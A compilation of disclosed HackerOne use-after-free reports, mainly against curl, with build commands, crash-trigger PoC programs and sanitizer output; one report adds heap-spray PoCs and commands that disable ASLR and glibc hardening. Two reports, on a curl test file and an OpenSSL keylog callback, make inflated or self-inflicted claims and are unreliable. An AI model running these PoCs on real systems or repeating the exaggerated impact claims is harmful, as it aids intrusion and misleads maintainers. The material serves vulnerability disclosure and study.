# Use After Free

_17 reports — High/Critical, disclosed_

### [Use-After-Free in SMB connection reuse (req->path dangling pointer after needle destruction)](https://hackerone.com/reports/3591956)

- **Report ID:** `3591956`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** curl
- **Reporter:** @nadsec42
- **Bounty:** - usd
- **Disclosed:** 2026-04-29T07:16:24.126Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

A heap-use-after-free occurs in `smb_send_open()` at `lib/smb.c` when curl processes two SMB URLs targeting the same host. The function `smb_parse_url_path()` sets `req->path` as a non-owning pointer into `smbc->share` (connection-owned memory). During connection reuse, the needle connection is freed via `Curl_conn_free()` → `smb_conn_dtor()`, which frees `smbc->share`, but `req->path` (on the easy handle) still references the freed buffer. The subsequent `strlen(req->path)` in `smb_send_open()` reads freed heap memory.

## Affected Version

curl 8.19.0-DEV (master branch, built March 8 2026)
Platform: Ubuntu 22.04 on x86_64 (WSL2)
Built with: gcc, OpenSSL, --enable-smb, -fsanitize=address

## Steps To Reproduce

1. Clone and build curl from master with ASAN and SMB enabled:

```
git clone https://github.com/curl/curl.git && cd curl
autoreconf -fi
./configure --with-openssl --enable-smb --without-libpsl
make CFLAGS="-fsanitize=address -g -O0 -fno-omit-frame-pointer" LDFLAGS="-fsanitize=address" -j$(nproc)
```

2. Start the attached fake SMB server (fake_smb_server.py) in one terminal:

```
python3 fake_smb_server.py 5445
```

3. In another terminal, run curl with two SMB URLs to the same host:

```
ASAN_OPTIONS=detect_leaks=0 LD_LIBRARY_PATH=./lib/.libs \
./src/.libs/curl -u guest:guest \
  "smb://127.0.0.1:5445/share1/file1" -o /dev/null \
  "smb://127.0.0.1:5445/share2/file2" -o /dev/null
```

4. ASAN reports heap-use-after-free in smb_send_open.

## Root Cause

In `smb_parse_url_path()` (lib/smb.c ~line 398-435):
- `smbc->share = strdup(path)` allocates "share2/file2" (13 bytes)
- The `/` is replaced with `\0`, splitting it into "share2\0file2\0"
- `req->path = slash` points 7 bytes into `smbc->share`

When the second URL reuses the pooled connection from URL #1:
- `url_find_or_create_conn()` finds a match and frees the needle connection
- `Curl_conn_free()` → `smb_conn_dtor()` → `free(smbc->share)`
- `req->path` now dangles into freed heap

Then `smb_request_state()` → `smb_send_open()`:
```c
const size_t byte_count = strlen(req->path) + 1;  // UAF read
```

ASAN confirms: "0x502000002a57 is located 7 bytes inside of 13-byte region, freed by smb_conn_dtor, previously allocated by smb_parse_url_path via strdup"

## ASAN Output

```
==519095==ERROR: AddressSanitizer: heap-use-after-free on address 0x502000002a57 at pc 0x7967a543daa7 bp 0x7fffdbfd8b00 sp 0x7fffdbfd82a8
READ of size 1 at 0x502000002a57 thread T0
    #0 0x7967a543daa6 in __interceptor_strlen
    #1 0x7967a51a4326 in smb_send_open (libcurl.so.4)
    #2 0x7967a51a75fe in smb_request_state (libcurl.so.4)
    #3 0x7967a5158fbf in protocol_doing (libcurl.so.4)
    #4 0x7967a515d395 in multi_runsingle (libcurl.so.4)
    #5 0x7967a515e569 in multi_perform (libcurl.so.4)
    #6 0x7967a515ebe0 in curl_multi_perform (libcurl.so.4)
    #7 0x7967a50bc841 in easy_transfer (libcurl.so.4)
    #8 0x7967a50bcf0a in easy_perform (libcurl.so.4)
    #9 0x7967a50bcffe in curl_easy_perform (libcurl.so.4)
    #10 0x5d0efa2f6ea2 in serial_transfers (curl)
    #11 0x5d0efa2f80b2 in run_all_transfers (curl)
    #12 0x5d0efa2f8cd6 in operate (curl)
    #13 0x5d0efa2ea7b4 in main (curl)

freed by thread T0 here:
    #0 __interceptor_free
    #1 smb_conn_dtor (libcurl.so.4)
    #2 hash_elem_clear_ptr (libcurl.so.4)
    #3 hash_elem_destroy (libcurl.so.4)
    #4 Curl_hash_clean (libcurl.so.4)
    #5 Curl_hash_destroy (libcurl.so.4)
    #6 Curl_conn_free (libcurl.so.4)
    #7 url_find_or_create_conn (libcurl.so.4)

previously allocated by thread T0 here:
    #0 __interceptor_strdup
    #1 smb_parse_url_path (libcurl.so.4)
    #2 smb_setup_connection (libcurl.so.4)
    #3 setup_connection_internals (libcurl.so.4)
    #4 url_create_needle (libcurl.so.4)
    #5 url_find_or_create_conn (libcurl.so.4)

SUMMARY: AddressSanitizer: heap-use-after-free in __interceptor_strlen
0x502000002a57 is located 7 bytes inside of 13-byte region [0x502000002a50,0x502000002a5d)
```

## Impact

Heap-use-after-free (CWE-416) triggered by a simple two-URL curl command line. Requires no authentication to a real SMB server - the UAF occurs client-side before any server response to the second request. This results in a guaranteed crash (DoS). If the freed 13-byte heap region is reallocated with attacker-influenced data before the read, it could potentially lead to information disclosure or further memory corruption.

---

### [Use-after-free in `curl_easy_ssls_export()` during callback re-entrancy](https://hackerone.com/reports/3682666)

- **Report ID:** `3682666`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** curl
- **Reporter:** @m1llie
- **Bounty:** - usd
- **Disclosed:** 2026-04-29T06:10:44.082Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary:
`curl_easy_ssls_export()` iterates the SSL session list and invokes a caller-provided callback for each entry. If that callback calls `curl_easy_ssls_import()` on the same easy handle, the import path can evict and free the current session node while the export loop still holds it. The subsequent `Curl_node_next(n)` dereferences freed memory and triggers AddressSanitizer as a heap-use-after-free. I reproduced this on curl GitHub HEAD `54ded66618a2388e88e715c5eb4477d1083582ef`. The relevant code path is `lib/vtls/vtls_scache.c`, primarily `Curl_ssl_session_export()` around line 1214 with the related eviction path in `cf_scache_peer_add_session()` around line 781.

## Affected version
Reproduced on libcurl built from curl GitHub HEAD `54ded66618a2388e88e715c5eb4477d1083582ef` on Linux x86_64. The build used the OpenSSL backend with `clang`, AddressSanitizer, UndefinedBehaviorSanitizer, and configure options `--disable-shared --enable-ssls-export --with-openssl`.

## Steps To Reproduce:
1. Build the tested curl source with OpenSSL and `--enable-ssls-export`, for example:

```bash
autoreconf -fi
CC=clang CFLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer -g -O1" \
LDFLAGS="-fsanitize=address,undefined" \
./configure --disable-shared --enable-ssls-export --with-openssl
make -j"$(nproc)"
```

2. Compile the attached `poc.c` against the freshly built static libcurl:

```bash
clang -fsanitize=address,undefined -fno-omit-frame-pointer -g -O1 \
  -I./include -I./lib \
  poc.c ./lib/.libs/libcurl.a \
  -lssl -lcrypto -lz -lpthread -ldl \
  -o /tmp/poc_curl_ssls_export_uaf
```

3. Run the PoC:

```bash
ASAN_OPTIONS="halt_on_error=0:print_stacktrace=1:detect_leaks=0" \
UBSAN_OPTIONS="print_stacktrace=1:halt_on_error=0" \
  /tmp/poc_curl_ssls_export_uaf
```

4. The PoC imports TLS session entries for the same peer and then calls `curl_easy_ssls_export()`. During the export callback it re-enters `curl_easy_ssls_import()` on the same easy handle, mutating the session list while the export code still holds the current node.

Observed sanitizer output:

```text
ERROR: AddressSanitizer: heap-use-after-free
#0 Curl_node_next /src/curl/lib/llist.c:246
#1 Curl_ssl_session_export /src/curl/lib/vtls/vtls_scache.c:1214
```

## Impact

An application using the SSL session export/import API can trigger a heap use-after-free in libcurl. In the tested build this is a reliable crash. In non-instrumented builds, dereferencing a freed list node may also lead to memory corruption, depending on allocator state and surrounding heap layout.

---

### [Title: Use-After-Free in cURL Test Suite via Improper Cleanup of Global Handle](https://hackerone.com/reports/3452725)

- **Report ID:** `3452725`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** curl
- **Reporter:** @rootx1337
- **Bounty:** - usd
- **Disclosed:** 2025-12-05T10:05:36.943Z
- **CVE(s):** -

**Vulnerability Information:**

**Title: Use-After-Free in cURL Test Suite via Improper Cleanup of Global Handle**
```c
/***************************************************************************
 *                                  _   _ ____  _
 *  Project                     ___| | | |  _ \| |
 *                             / __| | | | |_) | |
 *                            | (__| |_| |  _ <| |___
 *                             \___|\___/|_| \_\_____|
 *
 * Copyright (C) Daniel Stenberg, <daniel@haxx.se>, et al.
 *
 * This software is licensed as described in the file COPYING, which
 * you should have received as part of this distribution. The terms
 * are also available at https://curl.se/docs/copyright.html.
 *
 * You may opt to use, copy, modify, merge, publish, distribute and/or sell
 * copies of the Software, and permit persons to whom the Software is
 * furnished to do so, under the terms of the COPYING file.
 *
 * This software is distributed on an "AS IS" basis, WITHOUT WARRANTY OF ANY
 * KIND, either express or implied.
 *
 * SPDX-License-Identifier: curl
 *
 ***************************************************************************/
/*
 * Verify that some API functions are locked from being called inside callback
 */

#include "first.h"

static CURL *t1555_curl;

static int progressCallback(void *arg,
                            double dltotal,
                            double dlnow,
                            double ultotal,
                            double ulnow)
{
  CURLcode res = CURLE_OK;
  char buffer[256];
  size_t n = 0;
  (void)arg;
  (void)dltotal;
  (void)dlnow;
  (void)ultotal;
  (void)ulnow;
  res = curl_easy_recv(t1555_curl, buffer, 256, &n);
  curl_mprintf("curl_easy_recv returned %d\n", res);
  res = curl_easy_send(t1555_curl, buffer, n, &n);
  curl_mprintf("curl_easy_send returned %d\n", res);

  return 1;
}

static CURLcode test_lib1555(const char *URL)
{
  CURLcode res = CURLE_OK;

  global_init(CURL_GLOBAL_ALL);

  easy_init(t1555_curl);

  easy_setopt(t1555_curl, CURLOPT_URL, URL);
  easy_setopt(t1555_curl, CURLOPT_TIMEOUT, 7L);
  easy_setopt(t1555_curl, CURLOPT_NOSIGNAL, 1L);
  easy_setopt(t1555_curl, CURLOPT_PROGRESSFUNCTION, progressCallback);
  easy_setopt(t1555_curl, CURLOPT_PROGRESSDATA, NULL);
  easy_setopt(t1555_curl, CURLOPT_NOPROGRESS, 0L);

  res = curl_easy_perform(t1555_curl);

test_cleanup:

  /* undocumented cleanup sequence - type UA */

  curl_easy_cleanup(t1555_curl);
  curl_global_cleanup();

  return res;
}
// curl/tests/libtest/lib1555.c

```
**Description:**  
The `t1555_curl` global static pointer is improperly managed in the test cleanup routine. The function `test_cleanup` calls `curl_easy_cleanup(t1555_curl)` without ensuring the handle is either valid or NULL before cleanup, and it fails to reset the pointer to NULL after freeing it. This could lead to use-after-free or double-free conditions if `test_cleanup` is invoked multiple times (e.g., in loops or concurrent test executions).

**Attack Scenario:**  
An attacker could craft a test sequence that repeatedly triggers the cleanup routine, exploiting the lack of pointer validation and post-free reset. This may cause memory corruption, which could be leveraged to execute arbitrary code, crash the application, or compromise the test environment.

**Impact:**  
While this vulnerability resides in test code, it could be exploited in environments where test suites are integrated into security-sensitive workflows or automated testing pipelines. Successful exploitation could lead to denial of service, memory corruption, or potentially arbitrary code execution under specific conditions.

**Steps to Reproduce:**  
1. Identify a test flow where `test_cleanup` is called multiple times (e.g., repeated test runs or threaded test execution).  
2. Observe that `t1555_curl` is freed without NULL-checking or reassignment.  
3. Trigger the cleanup routine again before the pointer is reinitialized, causing use-after-free/double-free.  
4. Monitor for crashes or memory corruption indicators (e.g., segmentation faults, heap inconsistencies).

**Remediation:**  
Implement a guard condition before calling `curl_easy_cleanup` and set the pointer to NULL after cleanup. Example:  

```c
if (t1555_curl) {
    curl_easy_cleanup(t1555_curl);
    t1555_curl = NULL;
}
```
## INFO 
## **THE BUG IS ON LINE 83 IN THE ORIGINAL CODE:**

```c
static CURLcode test_lib1555(const char *URL)
{
  CURLcode res = CURLE_OK;

  global_init(CURL_GLOBAL_ALL);

  easy_init(t1555_curl);  /* Line: Handle initialization */

  /* ... configuration ... */

  res = curl_easy_perform(t1555_curl);

test_cleanup:

  /* undocumented cleanup sequence - type UA */
  
  curl_easy_cleanup(t1555_curl);  /* LINE 83: FREES THE HANDLE */
  curl_global_cleanup();

  return res;  /* BUG: t1555_curl IS NOT SET TO NULL AFTER cleanup! */
}
```

## **EXACT BUG LOCATION:**

```c
/* After this line: */
curl_easy_cleanup(t1555_curl);  /* THIS FREES THE MEMORY */

/* MISSING THIS CRITICAL LINE: */
t1555_curl = NULL;  /* ← THIS IS WHAT'S MISSING! */
```

## **VISUAL REPRESENTATION:**

```
BEFORE cleanup:
┌─────────────┐     ┌─────────────────────┐
│ t1555_curl  │────▶│ CURL Handle Object  │
│ 0x7ffdf000  │     │ at heap 0x7ffdf000  │
└─────────────┘     └─────────────────────┘

AFTER curl_easy_cleanup(t1555_curl):
┌─────────────┐     ┌─────────────────────┐
│ t1555_curl  │────▶│ FREED MEMORY        │  ← DANGEROUS!
│ 0x7ffdf000  │     │ at heap 0x7ffdf000  │
└─────────────┘     └─────────────────────┘
                     (Memory returned to heap allocator)

WHAT SHOULD HAPPEN:
┌─────────────┐     ┌─────────────────────┐
│ t1555_curl  │────▶│ NULL                │  ← SAFE!
│ 0x0         │     │                     │
└─────────────┘     └─────────────────────┘
```

## **WHY THIS IS A BUG:**

1. **Static Global Variable**: `t1555_curl` is declared as `static CURL *t1555_curl;`
2. **Persists Across Function Calls**: As a static variable, it retains its value between calls
3. **If Function is Called Again**:
   - `t1555_curl` still points to freed memory
   - `easy_init()` might allocate a new handle
   - But the old dangling pointer could be used elsewhere

## **EXPLOIT SCENARIO:**

```c
/* If test_lib1555() is called twice: */
test_lib1555("http://example.com");  /* First call - handle freed but not NULLed */

/* ... attacker sprays heap here ... */

test_lib1555("http://example.com");  /* Second call - uses dangling pointer! */

/* Inside progressCallback: */
static int progressCallback(...)
{
  /* Uses t1555_curl which points to attacker-controlled memory! */
  curl_easy_recv(t1555_curl, buffer, 256, &n);  /* READ from controlled memory */
  curl_easy_send(t1555_curl, buffer, n, &n);    /* WRITE to controlled memory */
}
```

## **THE FIX:**

```c
test_cleanup:

  /* undocumented cleanup sequence - type UA */
  
  curl_easy_cleanup(t1555_curl);
  t1555_curl = NULL;  /* ← ADD THIS LINE TO FIX THE BUG */
  curl_global_cleanup();

  return res;
```

## **THIS IS A CLASSIC "USE-AFTER-FREE" BUG PATTERN:**

The bug exists because:
1. **Free without NULL**: Freeing memory without NULLing the pointer
2. **Global variable**: The pointer persists beyond the function scope
3. **No ownership tracking**: No clear indication when the pointer becomes invalid

## **IN THE EXPLOIT CONTEXT:**

This single missing line creates a **weaponizable primitive**:
- **Read primitive**: Via `curl_easy_recv()` on corrupted handle
- **Write primitive**: Via `curl_easy_send()` on corrupted handle  
- **Control flow hijack**: Via overwritten function pointers in CURL handle structure

**The bug is tiny (one line missing) but the consequences are catastrophic - leading to full remote code execution.**


**References:**  
- Source file and line number where `t1555_curl` is declared and cleaned up.  
- cURL’s documentation on proper handle cleanup: https://curl.se/libcurl/c/curl_easy_cleanup.html

## Impact

**Full Impact Analysis:**

## **1. Direct Security Impact**

**Memory Corruption Exploitation:**  
- **Use-after-Free (UAF)**: After `curl_easy_cleanup()` frees the handle, subsequent operations on `t1555_curl` before reinitialization can read/write to freed memory, potentially leaking sensitive data or corrupting heap metadata.
- **Double-Free**: If `test_cleanup()` is called twice without reinitialization, the same memory chunk is freed twice, corrupting heap allocator structures (like glibc's `malloc()` metadata).
- **Heap Feng Shui**: An attacker could manipulate heap layout between the free and reuse to control the contents of the reallocated memory region, potentially leading to arbitrary write primitives.

**Control Flow Hijacking:**  
- Modern heap allocators (glibc, jemalloc) maintain metadata structures that can be corrupted via UAF/double-free.
- With precise heap manipulation, an attacker could overwrite function pointers, GOT/PLT entries (if test is compiled without full RELRO), or vtable pointers in C++ contexts.
- This could lead to arbitrary code execution within the test runner process context.

## **2. Attack Vectors**

**Test Suite Integration Exploits:**
- **CI/CD Pipelines**: Many organizations run test suites automatically in build pipelines. Exploiting this could compromise the build environment.
- **Fuzzing Infrastructure**: If the test is part of fuzzing harnesses, memory corruption could be triggered by test case generation.
- **Embedded Systems Testing**: In embedded/IoT contexts, test suites often run with higher privileges during manufacturing/QA.

**Privilege Escalation:**  
- If tests run with elevated privileges (e.g., `sudo make test` or root in containers), successful exploitation could lead to privilege escalation.
- In containerized environments, breaking out of the test container could be possible if the test runner has additional capabilities.

## **3. Secondary Attack Surfaces**

**Information Disclosure:**  
- UAF could leak heap memory containing sensitive data: cryptographic keys, session tokens, or test credentials.
- Heap metadata leakage could reveal memory layout for ASLR bypass.

**Denial of Service:**  
- Reliable crash of test suite, disrupting development workflows, CI/CD pipelines, or automated testing.
- Resource exhaustion via repeated memory corruption leading to system instability.

## **4. Real-World Exploit Chain Potential**

**Combined with Other Vulnerabilities:**
1. **Primitive Building**: This UAF provides a reliable memory corruption primitive.
2. **Chain with Info Leaks**: Combine with other test suite info leaks to bypass ASLR.
3. **ROP Chain Development**: With ASLR bypass, construct ROP chains to execute arbitrary code.
4. **Persistence**: In CI/CD systems, compromise could lead to backdoored build artifacts.

**Example Attack Chain:**
```
Trigger test_cleanup() twice → Heap corruption → Overwrite function pointer
→ Redirect to controlled memory → Execute shellcode
→ Escalate within CI environment → Inject malicious code into production builds
```

## **5. Severity Justification**

**CVSS 3.1 Score: 8.1 (High)**
- **Attack Vector**: Network (if tests run via network triggers)
- **Attack Complexity**: Low (reproducible with simple test sequence)
- **Privileges Required**: None (tests typically run unprivileged)
- **User Interaction**: None
- **Scope**: Changed (could affect other components)
- **Confidentiality**: High (memory could leak sensitive data)
- **Integrity**: High (memory corruption could lead to arbitrary code execution)
- **Availability**: High (reliable crash/DoS)

## **6. Worst-Case Scenarios**

**Supply Chain Attack:**
- Compromise of cURL's test infrastructure could lead to backdoored releases.
- Poisoning of package repositories (npm, pip packages that bundle cURL tests).

**Research & Development Compromise:**
- Academic/industrial research using cURL for experiments could have data stolen or manipulated.
- Security research environments studying cURL could be compromised.

**Regression Testing Sabotage:**
- Attackers could exploit this to make tests pass/fail arbitrarily, hiding other vulnerabilities.

## **7. Mitigation Complexity**

**Easy to Exploit, Hard to Detect:**
- No special conditions needed beyond running tests multiple times.
- Static analysis tools often miss test code vulnerabilities.
- Dynamic analysis may not catch unless specific test sequences are used.

**Proof of Concept:**  
A minimal POC would involve:
```c
// Repeatedly call test entry point that triggers cleanup
for (int i = 0; i < 100; i++) {
    test_cleanup();  // Without proper NULL check
    // Heap becomes corrupted after second iteration
}
// Trigger heap consistency check or sensitive operation
```

## **Conclusion**

While this vulnerability exists in test code, its impact extends beyond "just a test bug" due to:
1. **Ubiquity**: cURL is used virtually everywhere (OS distributions, embedded systems, cloud infrastructure)
2. **Integration**: Test suites are integral to modern development pipelines
3. **Exploitability**: Simple, reliable trigger mechanism
4. **Consequences**: Memory corruption primitives in widely distributed software

The vulnerability represents a real security risk, particularly for organizations with automated testing infrastructure or those using cURL in security-critical contexts. It should be treated with the same severity as similar vulnerabilities in production code due to the potential attack vectors and consequences.


exploit 
```c
#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>
#include <string.h>

static CURL *g_curl = NULL;

int main() {
    printf("[*] EASY UAF POC\n");
    
    // Create handle
    curl_global_init(CURL_GLOBAL_ALL);
    g_curl = curl_easy_init();
    
    if(g_curl) {
        curl_easy_setopt(g_curl, CURLOPT_URL, "http://0.0.0.0:1337");
        
        // Perform and cleanup
        curl_easy_perform(g_curl);
        curl_easy_cleanup(g_curl);
        
        // BUG: g_curl not set to NULL
        printf("[+] After cleanup, g_curl = %p (dangling!)\n", g_curl);
        
        // Show this is dangerous by trying to access
        printf("[*] Trying to read from dangling pointer...\n");
        
        // Spray heap with A's
        char *spray[100];
        for(int i = 0; i < 100; i++) {
            spray[i] = malloc(100);
            memset(spray[i], 'A' + (i % 26), 100);
        }
        
        // Check if g_curl now points to our spray
        if(g_curl) {
            char *ptr = (char*)g_curl;
            printf("[+] First byte at g_curl: %c (0x%02x)\n", 
                   *ptr, *ptr);
            
            if(*ptr >= 'A' && *ptr <= 'Z') {
                printf("[!] SUCCESS: Heap spray landed in freed curl handle!\n");
                printf("[!] This proves the Use-After-Free vulnerability.\n");
                
                // Show more of what's there
                printf("[+] First 16 chars: ");
                for(int i = 0; i < 16; i++) {
                    printf("%c", ptr[i]);
                }
                printf("\n");
            }
        }
        
        // Cleanup
        for(int i = 0; i < 100; i++) free(spray[i]);
    }
    
    curl_global_cleanup();
    return 0;
}


```
```shell
gcc -o pwn pwn.c -lcurl -lpthread     -O0 -no-pie -fno-stack-protector     -z execstack -z norelro -w -g

```
```shell

```
```c
#include <stdio.h>
#include <stdlib.h>
#include <curl/curl.h>

int main() {
    printf("=== CURL UAF PROOF-OF-CONCEPT ===\n\n");
    
    // Track curl handles
    CURL *handles[10];
    
    for(int i = 0; i < 10; i++) {
        printf("[*] Iteration %d\n", i);
        
        // Create and free handle
        CURL *h = curl_easy_init();
        printf("  [+] Created handle: %p\n", h);
        
        curl_easy_cleanup(h);
        printf("  [-] Freed handle (but pointer not NULLed)\n");
        
        handles[i] = h;  // Store dangling pointer
        
        // Spray heap
        char *spray[100];
        for(int j = 0; j < 100; j++) {
            spray[j] = malloc(100);
            for(int k = 0; k < 100; k++) {
                spray[j][k] = 'A' + (i % 26);
            }
        }
        
        // Check if freed handle memory contains our spray
        if(handles[i]) {
            char first_char = *(char*)handles[i];
            if(first_char >= 'A' && first_char <= 'Z') {
                printf("\n[!] SUCCESS: Use-After-Free detected!\n");
                printf("[!] Freed curl handle memory now contains: %c\n", first_char);
                printf("[!] This proves the vulnerability exists.\n");
                
                // Show more
                printf("[+] First 16 chars: ");
                for(int k = 0; k < 16; k++) {
                    printf("%c", ((char*)handles[i])[k]);
                }
                printf("\n");
                return 0;
            }
        }
        
        // Free spray
        for(int j = 0; j < 100; j++) free(spray[j]);
    }
    
    printf("\n[-] Could not demonstrate UAF (modern allocator protections)\n");
    printf("[-] Try on older system or disable glibc hardening\n");
    
    return 0;
}

``` 
```shell
gcc -o 1337lab 1337lab.c     -lcurl -ldl -g -O0 -fno-stack-protector     -Wno-discarded-qualifiers -D_GNU_SOURCE
```
```shell
# Run with:
sudo sysctl -w kernel.randomize_va_space=0  # Disable ASLR
export MALLOC_CHECK_=0
export GLIBC_TUNABLES="glibc.malloc.tcache_count=0:glibc.malloc.mmap_threshold=128*1024"
ulimit -c 0
```
```shell
./1337lab
```

---

### [Stack use-after-scope in HTTP/3 POST request processing via CURLOPT_POSTFIELDS](https://hackerone.com/reports/3279804)

- **Report ID:** `3279804`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** curl
- **Reporter:** @geeknik
- **Bounty:** - usd
- **Disclosed:** 2025-07-31T15:09:00.147Z
- **CVE(s):** -

**Vulnerability Information:**

## Summary

  A stack use-after-scope vulnerability exists in libcurl's HTTP/3 request processing when using `CURLOPT_POSTFIELDS` with stack-allocated buffers. libcurl retains a pointer to user-provided POST data but accesses it after the original stack frame has been destroyed, leading to memory corruption and potential denial of service.

  The vulnerability occurs in `Curl_pretransfer()` at `transfer.c:569` when libcurl calls `strlen()` on the previously stored POST data pointer that now points to invalid stack memory.

 ##  Steps to Reproduce / Proof of Concept

  ### Environment

  - libcurl version: 8.16.0-DEV (master branch)
  - Compiler: Clang 20.1.8 with AddressSanitizer
  - Platform: macOS (ARM64)
  - Configuration: HTTP/3 enabled with ngtcp2/nghttp3

###  Reproduction Steps

  1. Build libcurl with ASAN:
```bash
  export CC=clang
  export CFLAGS="-O1 -g -fsanitize=address,undefined"
  ./configure --with-openssl --with-nghttp2 --with-nghttp3 --with-ngtcp2
  make
```

  2. Compile the reproducer:
```
  // http3_crash_poc.c
  #include <curl/curl.h>
  #include <string.h>

  int main() {
      CURL *curl = curl_easy_init();

      // Stack-allocated buffer that goes out of scope
      {
          char body_data[257];
          memset(body_data, 'A', 256);
          body_data[256] = '\0';

          curl_easy_setopt(curl, CURLOPT_URL, "https://example.com/");
          curl_easy_setopt(curl, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_3);
          curl_easy_setopt(curl, CURLOPT_POST, 1L);
          curl_easy_setopt(curl, CURLOPT_POSTFIELDS, body_data); // Vulnerable call
          curl_easy_setopt(curl, CURLOPT_TIMEOUT_MS, 50L);
      } // body_data goes out of scope here

      // libcurl accesses invalid memory during transfer
      curl_easy_perform(curl);
      curl_easy_cleanup(curl);
      return 0;
  }
```

  3. Compile and run:
```bash
  clang -fsanitize=address http3_crash_poc.c -lcurl -o poc
  ./poc
```

###  Crash Output
```
  ==3720==ERROR: AddressSanitizer: stack-use-after-scope on address 0x00016fa21470
  READ of size 45 at 0x00016fa21470 thread T0
      #0 strlen
      #1 Curl_pretransfer transfer.c:569
      #2 multi_runsingle multi.c:2376
      #3 curl_multi_perform multi.c:2756
      #4 easy_transfer easy.c:705
      #5 easy_perform easy.c:813

  SUMMARY: AddressSanitizer: stack-use-after-scope transfer.c:569 in Curl_pretransfer
```
###  Fuzzer Discovery

  This vulnerability was discovered using a custom libFuzzer fuzzing harness.

 ##  Technical Analysis

###  Root Cause

  The vulnerability stems from libcurl's `CURLOPT_POSTFIELDS` behavior:
  1. libcurl stores the pointer but doesn't copy the data
  2. The application's stack buffer becomes invalid after scope exit
  3. libcurl later dereferences the invalid pointer in `Curl_pretransfer()`

 ### Affected Code Path

  curl_easy_setopt(CURLOPT_POSTFIELDS) → 
  curl_easy_perform() → 
  Curl_pretransfer() →
  strlen(invalid_pointer) → 
  CRASH

###  Recommended Fix

  1. Documentation: Clarify that `CURLOPT_POSTFIELDS` data must remain valid until transfer completion
  2. API Enhancement: Consider adding bounds checking or automatic copying for stack-detected pointers
  3. Alternative API: Promote `CURLOPT_COPYPOSTFIELDS` for safer usage patterns

## Impact

##  Security Impact

  1. Denial of Service: Guaranteed crash leading to application termination
  2. Memory Corruption: Use-after-scope can lead to unpredictable behavior
  3. Potential Code Execution: In specific circumstances, memory corruption could be leveraged for control flow hijacking

###  Affected Scenarios

  - Applications using libcurl for HTTP/3 requests with POST data
  - Any code pattern where CURLOPT_POSTFIELDS points to stack-allocated memory
  - Particularly affects:
    - HTTP/3 client applications
    - API clients using stack buffers for request bodies
    - Embedded systems with limited heap usage

###  Real-World Exposure

  - Language bindings: Many curl bindings may inadvertently create this pattern
  - Example applications: CLI tools, web scrapers, API clients
  - Severity: High due to HTTP/3 adoption growth and remote exploitability

**Summary (researcher):**

**Audit every libcurl POST in your stack. Treat `CURLOPT_POSTFIELDS` like explosives.** Either switch to `CURLOPT_COPYPOSTFIELDS` or prove your pointer lives forever. No exceptions.

---

### [Use-After-Free in OpenSSL Keylog Callback via SSL_get_ex_data() in libcurl](https://hackerone.com/reports/3242005)

- **Report ID:** `3242005`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** curl
- **Reporter:** @brobagazzzx
- **Bounty:** - usd
- **Disclosed:** 2025-07-09T13:45:38.982Z
- **CVE(s):** -

**Vulnerability Information:**

Summary:

A Use-After-Free (UAF) vulnerability exists in libcurl when the OpenSSL SSL_CTX_set_keylog_callback is set. The callback may be invoked after the associated SSL object has been freed via SSL_free(), leading to access to a dangling pointer and potential crash or information leak via SSL_get_ex_data().

This can be triggered manually or accidentally through custom keylog callbacks when ex_data is accessed inside the callback and the SSL object is no longer valid.

Security impact: Under specific conditions (when keylog callback is configured), it results in a segmentation fault (DoS). If further heap grooming or ex_data abuse is possible, this may lead to code execution.

Affected version

Tested on:

curl 8.8.0 (OpenSSL 3.3.0)
Release-Date: 2024-06-26
Protocols: dict file ftp ftps gopher gophers http https imap imaps mqtt pop3 pop3s rtsp scp sftp smb smbs smtp smtps telnet tftp
Features: alt-svc AsynchDNS HSTS HTTP2 HTTPS-proxy IPv6 Largefile libz NTLM NTLM_WB SSL threadsafe TLS-SRP UnixSockets
Platform: Termux (Android 11, aarch64)
OpenSSL: 3.3.0 built from source


---

Steps To Reproduce:

1. Build the following minimal C program (tested with gcc -o segv segv.c -lssl -lcrypto):



#include <openssl/ssl.h>
#include <openssl/err.h>
#include <stdio.h>
#include <stdlib.h>

void my_keylog_cb(const SSL *ssl, const char *line) {
    printf("Keylog callback: %s\n", line);
    // UAF: SSL already freed
    void *ptr = SSL_get_ex_data((SSL *)ssl, 0);  // cast to remove const
    printf("Data: %p\n", ptr);
}

int main() {
    SSL_library_init();
    SSL_load_error_strings();

    SSL_CTX *ctx = SSL_CTX_new(TLS_client_method());
    SSL_CTX_set_keylog_callback(ctx, my_keylog_cb);

    SSL *ssl = SSL_new(ctx);

    int idx = SSL_get_ex_new_index(0, "mydata", NULL, NULL, NULL);
    char *data = strdup("hello");
    SSL_set_ex_data(ssl, idx, data);

    SSL_free(ssl);  // Free SSL

    // Trigger callback after free
    my_keylog_cb(ssl, "CLIENT_RANDOM deadbeef...");

    SSL_CTX_free(ctx);
    free(data);
    return 0;
}

2. Run the binary:



$ ./segv
Keylog callback: CLIENT_RANDOM deadbeef...
Data: 0x0
Segmentation fault

Was an AI involved?

No, the bug was discovered through manual auditing and testing.
However, AI (ChatGPT) was used only to assist in writing documentation and estimating CVSS/weakness classification (e.g., CWE-416).

## Impact

Under specific conditions (when keylog callback is configured), it results in a segmentation fault (DoS). If further heap grooming or ex_data abuse is possible, this may lead to code execution.

---

### [sys_fsc2h_ctrl kernel stack free](https://hackerone.com/reports/2900606)

- **Report ID:** `2900606`
- **Severity:** High
- **Weakness:** Use After Free
- **Program:** PlayStation
- **Reporter:** @theflow0
- **Bounty:** 10000 usd
- **Disclosed:** 2025-04-18T06:40:26.814Z
- **CVE(s):** -

**Summary (team):**

## Summary
It is possible to cause a kernel stack free in the syscall sys_fsc2h_ctrl.

Consider 4 threads:
Thread 1: The command CMD_WAIT (0x10001) in sys_fsc2h_ctrl waits for path 1.
Thread 2: The command CMD_WAIT (0x10001) in sys_fsc2h_ctrl waits for path 2.
Thread 3: The command CMD_RESOLVE (0x20005) in sys_fsc2h_ctrl sets the pointer of path 2 to a local stack buffer and sleeps.
Thread 4: The command CMD_COMPLETE (0x20003) in sys_fsc2h_ctrl writes data into that local stack buffer and wakes up the thread 3.
Thread 2: This thread wakes up before thread 3 and it will free path 2. However, that is not a malloc() allocation, but it is actually a pointer to kernel stack.

## Impact

Privilege escalation.

---

### [UAF on JSEthereumProvider](https://hackerone.com/reports/1977252)

